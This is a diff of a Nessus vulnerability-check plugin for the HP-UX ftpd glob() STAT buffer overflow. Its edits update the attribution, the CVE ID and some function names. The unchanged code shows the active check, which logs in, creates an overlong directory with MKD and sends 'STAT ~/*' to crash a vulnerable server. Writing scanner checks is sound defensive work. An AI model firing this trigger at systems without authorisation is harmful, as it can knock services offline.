@@ -1,5 +1,7 @@
 #
-# This script was written by Xue Yong Zhi <xueyong@udel.edu>
+# This script was written by Xue Yong Zhi <yong@tenablesecurity.com>
+#
+# (C) Tenable Network Security
 #
 #
 # See the Nessus Scripts License for details
@@ -23,9 +25,9 @@
 if(description)
 {
  script_id(11372);
- script_version ("$Revision: 1.1 $");
  script_bugtraq_id(2552);
- script_cve_id("CAN-2001-0248");
+ script_version ("$Revision: 1.7 $");
+ script_cve_id("CVE-2001-0248");
  name["english"] = "HP-UX ftpd glob() Expansion STAT Buffer Overflow";
 
  script_name(english:name["english"]);
@@ -52,10 +54,9 @@ Risk factor : High";
  script_family(english:"FTP");
 
 
- script_copyright(english:"This script is Copyright (C) 2003 Xue Yong Zhi",
- 		  francais:"Ce script est Copyright (C) 2003 Xue Yong Zhi");
+ script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security");
 
- script_dependencie("find_service.nes", "ftp_write_dirs.nes");
+ script_dependencie("find_service.nes", "ftp_writeable_directories.nasl");
  script_require_keys("ftp/login", "ftp/writeable_dir");
  script_require_ports("Services/ftp", 21);
  exit(0);
@@ -97,7 +98,7 @@ if(safe_checks)
   #HP-UX 10.0, 10.10, 10.20, 10.30, 11.0(ICAT)
   #HP HP-UX 10.0.1, 10.10, 10.20, 11.0 and HP HP-UX (VVOS) 10.24, 11.0.4(bugtrap)
   #Actually Looking for 10.*, 11.0* here
-  if(ereg(pattern:"FTP server.*[vV]ersion[^0-9]*(10\.[0-9]+|11\.0)",
+  if(egrep(pattern:"FTP server.*[vV]ersion[^0-9]*(10\.[0-9]+|11\.0)",
   	  string:banner))vuln = 1;
 
   if(vuln)
@@ -132,26 +133,26 @@ if(soc)
 {
  if(login && wri)
  {
-	if(ftp_log_in(socket:soc, user:login, pass:password))
+	if(ftp_authenticate(socket:soc, user:login, pass:password))
 	{
 		# We are in
 
 		c = string("CWD ", wri, "\r\n");
 		send(socket:soc, data:c);
 		b = ftp_recv_line(socket:soc);
-		if(!ereg(pattern:"^250.*", string:b)) exit(0);
+		if(!egrep(pattern:"^250.*", string:b)) exit(0);
 		mkd = string("MKD ", crap(505), "\r\n");	#505+4+2=511
 		mkdshort = string("MKD ", crap(249), "\r\n");	#249+4+2=255
 		stat = string("STAT ~/*\r\n");
 
 		send(socket:soc, data:mkd);
 		b = ftp_recv_line(socket:soc);
-		if(!ereg(pattern:"^257 .*", string:b)) {
+		if(!egrep(pattern:"^257 .*", string:b)) {
 			#If the server refuse to creat a long dir for some 
 			#reason, try a short one to see if it will die.
 			send(socket:soc, data:mkdshort);
 			b = ftp_recv_line(socket:soc);
-			if(!ereg(pattern:"^257 .*", string:b)) exit(0);
+			if(!egrep(pattern:"^257 .*", string:b)) exit(0);
 		}
 
 		#STAT use control channel
